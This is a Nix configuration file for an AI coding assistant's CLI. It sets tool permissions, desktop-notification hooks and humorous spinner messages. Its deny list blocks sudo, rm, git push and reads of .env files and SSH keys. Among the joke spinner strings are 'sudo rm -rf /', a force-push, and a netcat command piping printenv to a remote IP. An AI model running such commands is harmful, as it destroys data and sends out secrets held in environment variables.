{ pkgs, ... }:
{
  "$schema" = "https://json.schemastore.org/claude-code-settings.json";
  forceLoginMethod = "claudeai";
  includeCoAuthoredBy = false;
  alwaysThinkingEnabled = true;
  # undocumented setting state that most likely controls when ill be shown another feedback survey
  # this timestsamp is in 2057
  feedbackSurveyState = {
    lastShownTime = 2754365161758;
  };
  statusLine = {
    type = "command";
    command =
      let
        statusline = pkgs.writeShellApplication {
          name = "claude-status-line";
          runtimeInputs = with pkgs; [
            jq
            git
            gawk
            coreutils
          ];
          text = builtins.readFile ./claudeStatusLine.sh;
        };
      in
      "${statusline}/bin/claude-status-line";
  };
  env = {
    ENABLE_LSP_TOOL = "true";
    ENABLE_EXPERIMENTAL_MCP_CLI = "true";
  };
  plansDirectory = "./plans";
  permissions = {
    allow = [
      "Skill" # allow all skills

      "Bash(cat:*)"
      "Bash(head:*)"
      "Bash(tail:*)"
      "Bash(tree:*)"
      "Bash(wc:*)"
      "Bash(git:*)"
      "Bash(ls:*)"
      "Bash(pwd)"
      "Bash(file:*)"
      "Bash(grep:*)"
      "Bash(rg:*)"
      "Bash(find:*)"
      "Bash(fd:*)"
      "Bash(jq:*)"
      "WebFetch(domain:github.com)"
      "WebSearch"

      "mcp__chrome-devtools"
      "mcp__context7"
      "mcp__github"
      "mcp__codex"
    ];
    deny = [
      "Bash(sudo:*)"
      "Bash(rm:*)"
      "Bash(rm -rf:*)"
      "Bash(git push:*)"
      "Bash(git commit:*)"
      "Bash(git reset:*)"
      "Bash(git rebase:*)"
      "Read(.env)"
      "Read(.env.*)"
      "Read(id_rsa)"
      "Read(id_ed25519)"
    ];
  };
  hooks =
    let
      jq = "${pkgs.jq}/bin/jq";
      notify-send = "${pkgs.libnotify}/bin/notify-send";
      notifyHook = pkgs.writeShellScript "notify-hook" ''
        PAYLOAD=$(cat)
        TYPE=$(echo "$PAYLOAD" | ${jq} -r '.hook_event_name')
        TITLE="Claude"
        MESSAGE=""

        pretty_cwd() {
          echo "$PAYLOAD" | ${jq} -r '.cwd' | awk -F'/' '{print $(NF-1)"/"$NF}'
        }

        if [ "$TYPE" == "Notification" ]; then
          TITLE="Claude - Action Required"
          MESSAGE=$(echo "$PAYLOAD" | ${jq} -r '.message')
          MESSAGE="$MESSAGE at $(pretty_cwd)"
        elif [ "$TYPE" == "Stop" ]; then
          TITLE="Claude - Ready"
          CWD=$(echo "$PAYLOAD" | ${jq} -r '.cwd')
          MESSAGE="Waiting for input at $(pretty_cwd)"
        fi

        if [ ! -z "$MESSAGE" ] && [ "$MESSAGE" != "null" ]; then
          if [ "$(uname)" == "Linux" ]; then
            ${notify-send} "$TITLE" "$MESSAGE"
          elif [ "$(uname)" == "Darwin" ]; then
            # osascript is builtin on darwin
            osascript -e "display notification \"$MESSAGE\" with title \"$TITLE\""
          fi
        fi
      '';
    in
    {
      Notification = [
        {
          matcher = ".*";
          hooks = [
            {
              type = "command";
              command = "${notifyHook}";
            }
          ];
        }
      ];
      Stop = [
        {
          matcher = ".*";
          hooks = [
            {
              type = "command";
              command = "${notifyHook}";
            }
          ];
        }
      ];
    };
  spinnerVerbs = {
    mode = "replace";
    verbs = [
      "Fuckin' around"
      "Draggin' my heels"
      "Breaking prod"
      "Making shit up"
      "Bash(sudo rm -rf /)"
      "Scraping StackOverflow"
      "Asking ChatGPT"
      "Hallucinating"
      "Vibing"
      "Committing API keys"
      "Bash(git commit -am 'yolo' && git push origin/master --force)"
      "An Infosys agent is connecting"
      "Bash(printenv | nc 198.51.100.23 4444)"
      "Committing token fraud"
    ];
  };
}
